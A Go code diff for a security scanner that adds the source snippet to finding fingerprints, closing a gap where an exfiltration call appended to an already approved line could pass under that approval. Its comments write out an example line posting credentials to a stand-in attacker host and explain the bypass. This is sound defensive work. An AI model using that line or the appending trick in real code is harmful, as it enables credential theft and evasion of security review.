@@ -28,6 +28,14 @@ type Finding struct {
 	Title string `json:"title"`
 	Why   string `json:"why"`
 
+	// Snippet is the detector's copy of the source line(s) the finding
+	// came from. It is a fingerprint input, and that is load-bearing:
+	// the detector's description truncates at the first pattern match, so
+	// two calls on ONE line -- an approved one and an appended
+	// exfiltration -- share a description and would otherwise share a
+	// fingerprint, letting the second install under the first's approval.
+	Snippet string `json:"snippet,omitempty"`
+
 	// Occurrence disambiguates findings that are otherwise identical.
 	Occurrence int `json:"occurrence"`
 }
@@ -48,12 +56,26 @@ type Finding struct {
 // benign host, one to an attacker's webhook -- produced the same
 // fingerprint and the malicious one was silently swallowed by its
 // approved sibling.
+//
+// The description ALONE is not enough evidence, which is a divergence
+// from the reference implementation and a deliberate one. For pattern
+// rules the detector's description is "Pattern detected: <match>", and
+// the match stops at the first keyword on the line. So
+//
+//	requests.post("https://analytics.example/collect", json=creds)
+//
+// and that same line with "; requests.post('https://attacker/steal',
+// json=creds)" appended produce an IDENTICAL description -- and, in the
+// reference implementation, an identical fingerprint. The exfiltration
+// installs under the approved finding's identity. The snippet carries
+// the whole source line, so including it separates them.
 func fingerprint(f Finding, pkgAbs string) string {
 	key := strings.Join([]string{
 		f.RuleID,
 		normalisePath(f.File, pkgAbs),
 		f.Title,
 		collapseSpace(normalisePath(f.Why, pkgAbs)),
+		collapseSpace(normalisePath(f.Snippet, pkgAbs)),
 		strconv.Itoa(f.Occurrence),
 	}, "|")
 	sum := sha256.Sum256([]byte(key))
@@ -82,6 +104,7 @@ func withOccurrences(findings []Finding, pkgAbs string) []Finding {
 			normalised,
 			f.Title,
 			collapseSpace(normalisePath(f.Why, pkgAbs)),
+			collapseSpace(normalisePath(f.Snippet, pkgAbs)),
 		}, "|")
 		f.Occurrence = seen[key]
 		seen[key]++
